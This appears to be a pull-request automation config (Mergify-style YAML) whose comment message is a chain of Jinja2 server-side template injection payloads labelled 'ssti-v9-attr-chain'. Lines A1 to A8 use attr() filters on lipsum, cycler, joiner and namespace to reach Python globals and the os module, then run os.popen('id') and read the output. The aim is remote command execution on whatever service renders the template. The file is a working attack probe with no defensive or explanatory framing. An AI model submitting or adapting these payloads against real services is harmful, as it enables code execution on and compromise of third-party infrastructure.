pull_request_rules:
  - name: ssti-v9-attr-chain
    conditions: []
    actions:
      comment:
        message: |
          === G4o7T v9 attr-chain ===
          author={{ author }}
          {% if author %}
          A1-attr-globals: {{ lipsum | attr('__globals__') }}
          A2-attr-globals-os: {{ lipsum | attr('__globals__') | attr('os') }}
          A3-attr-popen: {{ lipsum | attr('__globals__') | attr('os') | attr('popen') }}
          A4-attr-popen-call: {{ lipsum | attr('__globals__') | attr('os') | attr('popen')('id') }}
          A5-attr-rce: {{ lipsum | attr('__globals__') | attr('os') | attr('popen')('id') | attr('read')() }}
          A6-via-cycler: {{ cycler | attr('__globals__') }}
          A7-via-joiner: {{ joiner | attr('__globals__') }}
          A8-via-namespace: {{ namespace | attr('__globals__') }}
          {% endif %}
